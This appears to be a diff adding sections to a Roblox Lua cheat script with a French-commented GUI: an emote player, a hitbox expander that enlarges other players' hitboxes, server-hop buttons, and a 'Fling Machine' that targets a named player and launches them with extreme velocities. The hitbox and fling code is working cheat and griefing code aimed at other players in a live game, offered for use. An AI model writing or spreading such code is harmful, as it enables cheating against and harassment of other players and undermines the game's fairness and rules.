+    Callback = function(Value)
+        EmoteSettings.TimePosition = Value
+        -- ACTUALISATION AUTOMATIQUE
+        if CurrentTrack and CurrentTrack.IsPlaying and CurrentTrack.Length > 0 then
+            pcall(function()
+                CurrentTrack.TimePosition = math.clamp(Value, 0, 1) * CurrentTrack.Length
+            end)
+        end
+    end
+})
+
+-- Toggles
+EmoteSection:AddToggle({
+    Name = "Stop On Move",
+    Default = true,
+    Callback = function(Value)
+        EmoteSettings.StopOnMove = Value
+        -- S'applique immédiatement
+    end
+})
+
+EmoteSection:AddToggle({
+    Name = "Allow Invisible",
+    Default = true,
+    Callback = function(Value)
+        EmoteSettings.AllowInvisible = Value
+        if not Value then
+            restoreCollisionStates()
+        else
+            local character = game.Players.LocalPlayer.Character
+            if character and CurrentTrack and CurrentTrack.IsPlaying then
+                saveCollisionStates(character)
+            end
+        end
+    end
+})
+
+-- Détection du mouvement pour Stop On Move
+local lastPosition = Vector3.new()
+game:GetService("RunService").RenderStepped:Connect(function()
+    local character = game.Players.LocalPlayer.Character
+    if character and character.PrimaryPart then
+        if EmoteSettings.StopOnMove and CurrentTrack and CurrentTrack.IsPlaying then
+            local moved = (character.PrimaryPart.Position - lastPosition).Magnitude > 0.1
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            local jumped = humanoid and humanoid:GetState() == Enum.HumanoidStateType.Jumping
+            
+            if moved or jumped then
+                StopTrack()
+                restoreCollisionStates()
+                
+                Ruii:CreateNotifier():Notify({
+                    Title = "Emote Player", 
+                    Content = "Emote stopped (moved)",
+                    Icon = "walk"
+                })
+            end
+        end
+        lastPosition = character.PrimaryPart.Position
+    end
+end)
+
+-- Nettoyage
+game:GetService("UserInputService").WindowFocusReleased:Connect(function()
+    if CurrentTrack then
+        StopTrack()
+        restoreCollisionStates()
+    end
+end)
+
+-- Message d'initialisation
+task.spawn(function()
+    wait(2)
+    Ruii:CreateNotifier():Notify({
+        Title = "Emote Player",
+        Content = "Settings now update in real-time!",
+        Icon = "settings"
+    })
+end)
+
+------------------------------------------------------------------------------
+
+
+--// HITBOX EXPANDER (Version avec ton script)
+local hitboxEnabled = false
+local hitboxSize = 30
+local hitboxTransparency = 0.5
+local hitboxColor = Color3.fromRGB(255, 0, 0)
+local outlineColor = Color3.fromRGB(0, 0, 0)
+
+local HitboxSection = Rage:AddSection({
+    Position = 'right',
+    Name = "HITBOX EXPANDER"
+})
+
+-- Toggle principal
+HitboxSection:AddToggle({
+    Name = "🎯 Hitbox Expander",
+    Callback = function(Value)
+        hitboxEnabled = Value
+        if Value then
+            Ruii:CreateNotifier():Notify({
+                Title = "Hitbox Expander",
+                Content = "Hitboxes activées! Taille: " .. hitboxSize,
+                Icon = "target"
+            })
+        else
+            ResetAllHitboxes()
+            Ruii:CreateNotifier():Notify({
+                Title = "Hitbox Expander", 
+                Content = "Hitboxes désactivées",
+                Icon = "target"
+            })
+        end
+    end
+})
+
+-- Taille des hitboxes
+HitboxSection:AddSlider({
+    Name = "Taille Hitbox",
+    Min = 5,
+    Max = 100,
+    Increment = 1,
+    Default = 30,
+    Callback = function(Value)
+        hitboxSize = Value
+        UpdateHitboxSizes()
+    end
+})
+
+-- Transparence
+HitboxSection:AddSlider({
+    Name = "Transparence",
+    Min = 0,
+    Max = 1,
+    Round = 2,
+    Default = 0.5,
+    Callback = function(Value)
+        hitboxTransparency = Value
+        UpdateHitboxTransparency()
+    end
+})
+
+-- Couleur de la hitbox
+HitboxSection:AddColorPicker({
+    Name = "Couleur Hitbox",
+    Default = Color3.fromRGB(255, 0, 0),
+    Callback = function(Value)
+        hitboxColor = Value
+        UpdateHitboxColors()
+    end
+})
+
+-- Couleur de l'outline
+HitboxSection:AddColorPicker({
+    Name = "Couleur Outline",
+    Default = Color3.fromRGB(0, 0, 0),
+    Callback = function(Value)
+        outlineColor = Value
+        UpdateOutlineColors()
+    end
+})
+
+-- Fonction pour réinitialiser toutes les hitboxes
+local function ResetAllHitboxes()
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player ~= game.Players.LocalPlayer and player.Character then
+            local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                hrp.Size = Vector3.new(2, 2, 1) -- Taille normale
+                hrp.Transparency = 1
+                hrp.CanCollide = true
+                
+                local outline = hrp:FindFirstChild("SelectionBox")
+                if outline then
+                    outline:Destroy()
+                end
+            end
+        end
+    end
+end
+
+-- Fonction pour mettre à jour les tailles
+local function UpdateHitboxSizes()
+    if hitboxEnabled then
+        for _, player in pairs(game.Players:GetPlayers()) do
+            if player ~= game.Players.LocalPlayer and player.Character then
+                local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+                local humanoid = player.Character:FindFirstChild("Humanoid")
+                
+                if hrp and humanoid and humanoid.Health > 0 then
+                    hrp.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
+                end
+            end
+        end
+    end
+end
+
+-- Fonction pour mettre à jour la transparence
+local function UpdateHitboxTransparency()
+    if hitboxEnabled then
+        for _, player in pairs(game.Players:GetPlayers()) do
+            if player ~= game.Players.LocalPlayer and player.Character then
+                local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+                local humanoid = player.Character:FindFirstChild("Humanoid")
+                
+                if hrp and humanoid and humanoid.Health > 0 then
+                    hrp.Transparency = hitboxTransparency
+                end
+            end
+        end
+    end
+end
+
+-- Fonction pour mettre à jour les couleurs
+local function UpdateHitboxColors()
+    if hitboxEnabled then
+        for _, player in pairs(game.Players:GetPlayers()) do
+            if player ~= game.Players.LocalPlayer and player.Character then
+                local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+                local humanoid = player.Character:FindFirstChild("Humanoid")
+                
+                if hrp and humanoid and humanoid.Health > 0 then
+                    hrp.Color = hitboxColor
+                end
+            end
+        end
+    end
+end
+
+-- Fonction pour mettre à jour les outlines
+local function UpdateOutlineColors()
+    if hitboxEnabled then
+        for _, player in pairs(game.Players:GetPlayers()) do
+            if player ~= game.Players.LocalPlayer and player.Character then
+                local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    local outline = hrp:FindFirstChild("SelectionBox")
+                    if outline then
+                        outline.Color3 = outlineColor
+                    end
+                end
+            end
+        end
+    end
+end
+
+-- Boucle principale (identique à ton script)
+game:GetService("RunService").RenderStepped:Connect(function()
+    if hitboxEnabled then
+        for _, player in pairs(game.Players:GetPlayers()) do
+            if player ~= game.Players.LocalPlayer then
+                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                    local hrp = player.Character.HumanoidRootPart
+                    local humanoid = player.Character:FindFirstChild("Humanoid")
+                    
+                    if humanoid and humanoid.Health > 0 then
+                        -- Appliquer les paramètres de hitbox
+                        hrp.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
+                        hrp.Transparency = hitboxTransparency
+                        hrp.CanCollide = false
+                        hrp.Color = hitboxColor
+                        
+                        -- Créer l'outline si elle n'existe pas
+                        if not hrp:FindFirstChild("SelectionBox") then
+                            local outline = Instance.new("SelectionBox")
+                            outline.Name = "SelectionBox"
+                            outline.Parent = hrp
+                            outline.Adornee = hrp
+                            outline.LineThickness = 0.05
+                            outline.Color3 = outlineColor
+                        else
+                            -- Mettre à jour l'outline existante
+                            local outline = hrp.SelectionBox
+                            outline.Color3 = outlineColor
+                        end
+                    else
+                        -- Joueur mort - reset
+                        hrp.Size = Vector3.new(2, 2, 1)
+                        hrp.Transparency = 1
+                        local outline = hrp:FindFirstChild("SelectionBox")
+                        if outline then
+                            outline:Destroy()
+                        end
+                    end
+                end
+            end
+        end
+    else
+        -- Hitbox désactivé - reset
+        ResetAllHitboxes()
+    end
+end)
+
+-- Gestion des nouveaux joueurs
+game.Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function(character)
+        if hitboxEnabled then
+            wait(1) -- Attendre le chargement
+        end
+    end)
+end)
+
+-- Reset quand le script s'arrête
+game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
+    -- S'assurer que tout est reset au respawn
+    wait(2)
+    if not hitboxEnabled then
+        ResetAllHitboxes()
+    end
+end)
+
+
+------------------------------------------------------------------------------
+
+-- Ajouter dans la section MISC
+local ServerSection = Misc:AddSection({
+    Position = 'right',
+    Name = "SERVER MANAGEMENT"
+})
+
+-- Stocker les infos du serveur actuel
+local currentServer = {
+    JobId = game.JobId,
+    PlaceId = game.PlaceId
+}
+
+-- Fonction pour rejoindre le même serveur
+local function rejoinSameServer()
+    local TeleportService = game:GetService("TeleportService")
+    
+    Ruii:CreateNotifier():Notify({
+        Title = "Server",
+        Content = "Reconnecting to the same server...",
+        Icon = "refresh-cw"
+    })
+    
+    local success, errorMsg = pcall(function()
+        TeleportService:TeleportToPlaceInstance(
+            currentServer.PlaceId,
+            currentServer.JobId,
+            game.Players.LocalPlayer
+        )
+    end)
+    
+    if not success then
+        Ruii:CreateNotifier():Notify({
+            Title = "Erreur",
+            Content = "Impossible to rejoin: " .. tostring(errorMsg),
+            Icon = "x"
+        })
+    end
+end
+
+-- Fonction pour rejoindre un serveur différent
+local function joinDifferentServer()
+    local TeleportService = game:GetService("TeleportService")
+    local HttpService = game:GetService("HttpService")
+    
+    Ruii:CreateNotifier():Notify({
+        Title = "Server",
+        Content = "Looking for a new server...",
+        Icon = "search"
+    })
+    
+    -- Récupérer la liste des serveurs
+    local servers = {}
+    local success, result = pcall(function()
+        return HttpService:JSONDecode(
+            game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")
+        )
+    end)
+    
+    if success and result and result.data then
+        -- Trouver un serveur différent
+        for _, server in ipairs(result.data) do
+            if server.id ~= game.JobId and server.playing < server.maxPlayers then
+                table.insert(servers, server)
+            end
+        end
+        
+        if #servers > 0 then
+            local randomServer = servers[math.random(1, #servers)]
+            
+            Ruii:CreateNotifier():Notify({
+                Title = "Server",
+                Content = "Connecting to the new server...",
+                Icon = "server"
+            })
+            
+            pcall(function()
+                TeleportService:TeleportToPlaceInstance(
+                    game.PlaceId,
+                    randomServer.id,
+                    game.Players.LocalPlayer
+                )
+            end)
+        else
+            Ruii:CreateNotifier():Notify({
+                Title = "Erreur",
+                Content = "No other servers found!",
+                Icon = "alert-triangle"
+            })
+        end
+    else
+        Ruii:CreateNotifier():Notify({
+            Title = "Erreur",
+            Content = "Impossible to recover servers",
+            Icon = "x"
+        })
+    end
+end
+
+-- Boutons dans l'interface
+ServerSection:AddButton({
+    Name = "🔁 Rejoin Server",
+    Callback = rejoinSameServer
+})
+
+ServerSection:AddButton({
+    Name = "🔄 Change Server", 
+    Callback = joinDifferentServer
+})
+
+------------------------------------------------------------------------------
+
+-- Variables de la cible
+local targetPlayer = nil
+local targetName = ""
+local flingConnection = nil
+local antiFlingConnection = nil
+local LocalPlayer = game.Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local originalPosition = nil
+
+-- Fonction de notification
+local notify = function(title, message)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = title,
+        Text = message,
+        Duration = 3,
+    })
+end
+
+-- 🛡️ ANTI-FLING ORIGINAL
+local function startAntiFling()
+    if antiFlingConnection then
+        antiFlingConnection:Disconnect()
+    end
+
+    antiFlingConnection = RunService.Heartbeat:Connect(function()
+        if not antiFlingConnection then return end
+        
+        local myChar = LocalPlayer.Character
+        if myChar then
+            local myRoot = myChar:FindFirstChild("HumanoidRootPart")
+            if myRoot then
+                -- Stabiliser la velocity
+                if myRoot.Velocity.Magnitude > 100 then
+                    myRoot.Velocity = Vector3.new(0, 0, 0)
+                end
+                
+                -- Anchor pour éviter d'être bougé
+                myRoot.Anchored = true
+                wait(0.1)
+                myRoot.Anchored = false
+            end
+        end
+    end)
+    
+    Ruii:CreateNotifier():Notify({
+        Title = "Anti-Fling",
+        Content = "Protection activée!",
+        Icon = "shield"
+    })
+end
+
+local function stopAntiFling()
+    if antiFlingConnection then
+        antiFlingConnection:Disconnect()
+        antiFlingConnection = nil
+    end
+end
+
+-- 💥 FONCTION FLING DE KILASIK (adaptée)
+local function SkidFling(TargetPlayer)
+    local Character = LocalPlayer.Character
+    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+    local RootPart = Humanoid and Humanoid.RootPart
+    local TCharacter = TargetPlayer.Character
+    if not TCharacter then return end
+    
+    local THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
+    local TRootPart = THumanoid and THumanoid.RootPart
+    local THead = TCharacter:FindFirstChild("Head")
+    local Accessory = TCharacter:FindFirstChildOfClass("Accessory")
+    local Handle = Accessory and Accessory:FindFirstChild("Handle")
+    
+    if Character and Humanoid and RootPart then
+        -- Sauvegarder la position originale si pas déjà fait
+        if not originalPosition and RootPart.Velocity.Magnitude < 50 then
+            originalPosition = RootPart.CFrame
+        end
+        
+        if THumanoid and THumanoid.Sit then
+            return
+        end
+        
+        if THead then
+            workspace.CurrentCamera.CameraSubject = THead
+        elseif Handle then
+            workspace.CurrentCamera.CameraSubject = Handle
+        elseif THumanoid and TRootPart then
+            workspace.CurrentCamera.CameraSubject = THumanoid
+        end
+        
+        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
+            return
+        end
+        
+        local FPos = function(BasePart, Pos, Ang)
+            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
+            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
+            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
+            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
+        end
+        
+        local SFBasePart = function(BasePart)
+            local TimeToWait = 1.5
+            local Time = tick()
+            local Angle = 0
+            repeat
+                if RootPart and THumanoid then
+                    if BasePart.Velocity.Magnitude < 50 then
+                        Angle = Angle + 100
+                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
+                        task.wait()
+                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                    else
+                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
+                    end
+                end
+            until Time + TimeToWait < tick() or not flingConnection
+        end
+        
+        local BV = Instance.new("BodyVelocity")
+        BV.Parent = RootPart
+        BV.Velocity = Vector3.new(0, 0, 0)
+        BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+        
+        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+        
+        if TRootPart then
+            SFBasePart(TRootPart)
+        elseif THead then
+            SFBasePart(THead)
+        elseif Handle then
+            SFBasePart(Handle)
+        end
+        
+        BV:Destroy()
+        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+        workspace.CurrentCamera.CameraSubject = Humanoid
+    end
+end
+
+-- Fonction pour RETOURNER à la position originale
+local function returnToOriginalPosition()
+    if not originalPosition then return end
+    
+    local Character = LocalPlayer.Character
+    if not Character then return end
+    
+    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
+    local RootPart = Humanoid and Humanoid.RootPart
+    
+    if RootPart then
+        -- Réinitialiser la position progressivement
+        RootPart.CFrame = originalPosition
+        Character:SetPrimaryPartCFrame(originalPosition)
+        RootPart.Velocity = Vector3.new(0, 0, 0)
+        RootPart.RotVelocity = Vector3.new(0, 0, 0)
+        
+        Ruii:CreateNotifier():Notify({
+            Title = "Fling",
+            Content = "Retour à la position initiale",
+            Icon = "home"
+        })
+    end
+end
+
+-- Fonction pour démarrer le fling
+local function startFling()
+    if not targetPlayer then 
+        Ruii:CreateNotifier():Notify({
+            Title = "Fling",
+            Content = "Aucune cible sélectionnée!",
+            Icon = "alert-triangle"
+        })
+        return 
+    end
+
+    if not targetPlayer.Character then
+        Ruii:CreateNotifier():Notify({
+            Title = "Fling",
+            Content = "Le joueur ciblé n'est plus disponible!",
+            Icon = "user-x"
+        })
+        return
+    end
+
+    -- Sauvegarder la position actuelle avant de commencer
+    local Character = LocalPlayer.Character
+    if Character and Character:FindFirstChild("HumanoidRootPart") then
+        local RootPart = Character.HumanoidRootPart
+        if RootPart.Velocity.Magnitude < 50 then
+            originalPosition = RootPart.CFrame
+        end
+    end
+
+    -- Déconnecte toute ancienne connexion
+    if flingConnection then
+        flingConnection:Disconnect()
+        flingConnection = nil
+    end
+
+    flingConnection = RunService.Heartbeat:Connect(function()
+        if targetPlayer and targetPlayer.Character then
+            SkidFling(targetPlayer)
+        else
+            -- Si la cible n'existe plus
+            if flingConnection then
+                flingConnection:Disconnect()
+                flingConnection = nil
+            end
+        end
+    end)
+    
+    Ruii:CreateNotifier():Notify({
+        Title = "Fling",
+        Content = "Fling activé sur " .. targetPlayer.Name,
+        Icon = "wind"
+    })
+end
+
+-- Fonction pour arrêter le fling et RETOURNER
+local function stopFling()
+    if flingConnection then
+        flingConnection:Disconnect()
+        flingConnection = nil
+    end
+    
+    -- Retourner à la position originale
+    returnToOriginalPosition()
+    
+    Ruii:CreateNotifier():Notify({
+        Title = "Fling",
+        Content = "Fling désactivé - Retour à la position",
+        Icon = "square"
+    })
+end
+
+-- Fonction pour trouver un joueur
+local function getTargetPlayer(playerName)
+    if playerName == "" then return nil end
+    
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            if player.DisplayName and string.lower(player.DisplayName):sub(1, #playerName) == string.lower(playerName) then
+                return player
+            end
+            if string.lower(player.Name):sub(1, #playerName) == string.lower(playerName) then
+                return player
+            end
+        end
+    end
+    return nil
+end
+
+-- 🔧 INTERFACE RUUII
+local FlingSection = Rage:AddSection({
+    Position = 'right',
+    Name = "FLING MACHINE"
+})
+
+-- Textbox pour choisir un pseudo
+local flingTextBox = FlingSection:AddTextBox({
+    Name = "🎯 Target Fling",
+    Default = "",
+    Placeholder = "Enter user",
+    Callback = function(input)
+        targetName = input
+        targetPlayer = getTargetPlayer(targetName)
+
+        if targetPlayer then
+            Ruii:CreateNotifier():Notify({
+                Title = "🎯 Target chosen",
+                Content = "Fling ready on : " .. targetPlayer.DisplayName,
+                Icon = "target"
+            })
+        else
+            Ruii:CreateNotifier():Notify({
+                Title = "❌ Player not found", 
+                Content = "Check the name: " .. targetName,
+                Icon = "user-x"
+            })
+        end
+    end
+})
+
+-- Toggle Fling
+FlingSection:AddToggle({
+    Name = "🌀 Fling",
+    Default = false,
+    Callback = function(Value)
+        if Value then
+            startFling()
+        else
+            stopFling()
+        end
+    end
+})
+
+local antiFling = false
+FlingSection:AddToggle({
+    Name = "🛡️ Anti-Fling",
+    Callback = function(Value)
+        antiFling = Value
+        if Value then
+            setupAntiFling()
+        end
+    end
+})
+
+function setupAntiFling()
+    local RunService = game:GetService("RunService")
+    
+    RunService.Heartbeat:Connect(function()
+        if not antiFling then return end
+        
+        local myChar = game.Players.LocalPlayer.Character
+        if myChar then
+            local myRoot = myChar:FindFirstChild("HumanoidRootPart")
+            if myRoot then
+                -- Stabiliser la velocity
+                if myRoot.Velocity.Magnitude > 100 then
+                    myRoot.Velocity = Vector3.new(0, 0, 0)
+                end
+                
+                -- Anchor pour éviter d'être bougé
+                myRoot.Anchored = true
+                wait(0.1)
+                myRoot.Anchored = false
+            end
+        end
+    end)
+end
+
+
+
+
+-- Nettoyage automatique
+LocalPlayer.CharacterAdded:Connect(function()
+    if flingConnection then
+        stopFling()
+    end
+    if antiFlingConnection then
+        stopAntiFling()
+    end
+    originalPosition = nil
+end)
+
+-- Message de démarrage
+Ruii:CreateNotifier():Notify({
+    Title = "Fling System",
+    Content = "Système Kilasik chargé! Retour auto à la position.",
+    Icon = "wind",
+    Duration = 5
+})
+
+
+------------------------------------------------------------------------------
